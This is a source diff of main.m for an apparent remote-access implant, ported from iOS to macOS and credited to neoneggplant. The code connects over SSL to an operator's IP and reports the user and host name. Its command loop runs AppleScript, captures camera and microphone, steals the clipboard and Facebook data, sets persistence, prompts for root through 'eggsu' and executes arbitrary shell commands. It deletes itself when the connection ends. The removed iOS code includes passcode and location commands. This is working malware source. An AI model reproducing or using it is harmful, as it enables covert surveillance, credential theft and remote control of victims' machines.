@@ -1,11 +1,12 @@
 //
 //  main.m
-//  esplios
+//  esplmacos
 //
 //  Created by Lucas Jackson on 8/6/17.
 //  Copyright © 2017 neoneggplant. All rights reserved.
 //
 
+#include "header.h"
 #import <Foundation/Foundation.h>
 #import "espl.h"
 
@@ -14,29 +15,8 @@ SSL_CTX *ssl_client_ctx;
 SSL *client_ssl;
 struct sockaddr_in serverAddress;
 
-NSArray *rocketCommands = [[NSArray alloc] initWithObjects:
-    @"play",
-    @"pause", 
-    @"next", 
-    @"prev", 
-    @"home", 
-    @"doublehome", 
-    @"lock", 
-    @"wake",
-    @"mute",
-    @"unmute",
-    @"locationon",
-    @"locationoff",nil];
-
-NSArray *rocketReplyCommands = [[NSArray alloc] initWithObjects:
-    @"ismuted",
-    @"getpasscode",
-    @"unlock",
-    @"lastapp",
-    @"islocked",nil];
-
 void connectToServer(NSDictionary *arguments);
-void interact(NSDictionary *arguments);
+void interact();
 
 int main(int argc, const char * argv[]) {
     @autoreleasepool {
@@ -46,17 +26,19 @@ int main(int argc, const char * argv[]) {
         NSMutableDictionary *jsonDict = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:NULL];
         connectToServer(jsonDict);
     }
-    //delete self after connection close`
+    //delete self after connection close
     remove(argv[0]);
     return 0;
 }
 
-void DestroySSL() {
+void DestroySSL()
+{
     ERR_free_strings();
     EVP_cleanup();
 }
 
-void ShutdownSSL() {
+void ShutdownSSL()
+{
     SSL_shutdown(client_ssl);
     SSL_free(client_ssl);
 }
@@ -78,7 +60,7 @@ void connectToServer(NSDictionary *arguments) {
     SSL_load_error_strings();
     SSL_library_init();
     OpenSSL_add_all_algorithms();
-    ssl_client_ctx = SSL_CTX_new(SSLv23_client_method());
+    ssl_client_ctx = SSL_CTX_new(SSLv23_method());
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     serverAddress.sin_family = AF_INET;
     inet_aton([[arguments objectForKey:@"ip"] UTF8String], &serverAddress.sin_addr);
@@ -102,7 +84,7 @@ void connectToServer(NSDictionary *arguments) {
     }
     
     //Send device name
-    NSString *systeminfo = [NSString stringWithFormat:@"%@@%@",NSUserName(),@"aye"];
+    NSString *systeminfo = [NSString stringWithFormat:@"%@@%@",NSUserName(),[[NSHost currentHost] localizedName]];
     SSL_write(client_ssl, [systeminfo UTF8String], (int)strlen([systeminfo UTF8String]));
     interact(arguments);
 }
@@ -111,24 +93,27 @@ void connectToServer(NSDictionary *arguments) {
 void interact(NSDictionary *arguments) {
     espl *esCommand = [[espl alloc] init];
     esCommand->client_ssl = client_ssl;
-    
+
     //listen for input data
     char buffer[2048] = "";
     while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
         NSData *jsonData = [[NSString stringWithFormat:@"%s",buffer] dataUsingEncoding:NSUTF8StringEncoding];
+        NSLog(@"fucking fuck %@",[NSString stringWithFormat:@"%s",buffer]);
         NSMutableDictionary *jsonDict = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:NULL];
         NSString *cmd = [jsonDict objectForKey:@"cmd"];
         NSString *args = [jsonDict objectForKey:@"args"];
         esCommand->terminator = (char*)[[jsonDict objectForKey:@"term"] UTF8String];
-        [esCommand debugLog:[NSString stringWithFormat:@"%@",jsonDict]];
-        if ([cmd isEqualToString:@"alert"]) {
-            [esCommand showAlert:args];
+        
+        if ([cmd isEqualToString:@"applescript"]) {
+            [esCommand runAppleScript:args];
         } else if ([cmd isEqualToString:@"picture"]) {
-            [esCommand takePicture:[args boolValue]];
+            [esCommand takePicture];
         } else if ([cmd isEqualToString:@"download"]) {
             [esCommand sendFile:args];
         } else if ([cmd isEqualToString:@"getpaste"]) {
             [esCommand getPasteBoard];
+        } else if ([cmd isEqualToString:@"idletime"]) {
+            [esCommand idleTime];
         } else if ([cmd isEqualToString:@"persistence"]) {
             NSString *ip = [arguments objectForKey:@"ip"];
             int port = [[arguments valueForKey:@"port"] intValue];
@@ -137,6 +122,10 @@ void interact(NSDictionary *arguments) {
             printf("%s\n","manipulate timestamp on a file");
         } else if ([cmd isEqualToString:@"cd"]) {
             [esCommand changeDirectory:args];
+        } else if ([cmd isEqualToString:@"brightness"]) {
+            [esCommand setBrightness:args];
+        } else if ([cmd isEqualToString:@"getfacebook"]) {
+            [esCommand getFacebook];
         } else if ([cmd isEqualToString:@"mic"]) {
             [esCommand mic:args];
         } else if ([cmd isEqualToString:@"pid"]) {
@@ -151,38 +140,14 @@ void interact(NSDictionary *arguments) {
             [esCommand tabComplete:args];
         } else if ([cmd isEqualToString:@"ls"]) {
             [esCommand listDirectory:args];
-        } else if ([cmd isEqualToString: @"battery"]) {
-            [esCommand getBattery];
-        } else if ([cmd isEqualToString: @"vibrate"]) {
-            [esCommand vibrate];
-        } else if ([cmd isEqualToString: @"getvol"]) {
-            [esCommand getVolume];
-        } else if ([cmd isEqualToString:@"setvol"]) {
-            [esCommand setVolume:args];
-        } else if ([cmd isEqualToString: @"bundleids"]) {
-            [esCommand bundleIds];
-        } else if ([cmd isEqualToString: @"locate"]) {
-            [esCommand locate];
-        } else if ([cmd isEqualToString: @"pid"]) {
-            [esCommand getPid];
-        } else if ([cmd isEqualToString:@"ipod"]) {
-            [esCommand ipod:args];
-        } else if ([cmd isEqualToString:@"openurl"]) {
-            [esCommand openURL:args];
-        } else if ([cmd isEqualToString:@"open"]) {
-            [esCommand openApp:args];
-        } else if ([cmd isEqualToString:@"say"]) {
-            [esCommand say:args];
-        } else if ([cmd isEqualToString:@"sysinfo"]) {
-            [esCommand sysinfo];
+        } else if ([cmd isEqualToString:@"eggsu"]) {
+            NSString *ip = [arguments objectForKey:@"ip"];
+            int port = [[arguments valueForKey:@"port"] intValue];
+            [esCommand su:args:ip:port];
         } else if ([cmd isEqualToString:@"exit"]) {
             printf("%s\n","exit program");
             [esCommand killTask];
-            exit(1);
-        } else if ([rocketCommands containsObject:cmd]) {
-            [esCommand rocketMC:cmd];
-        } else if ([rocketReplyCommands containsObject:cmd]) {
-            [esCommand rocketMCWithReply:cmd];
+            return;
         } else if (jsonDict != NULL) {
             [esCommand runTask:getFullCMD(jsonDict):true];
         }
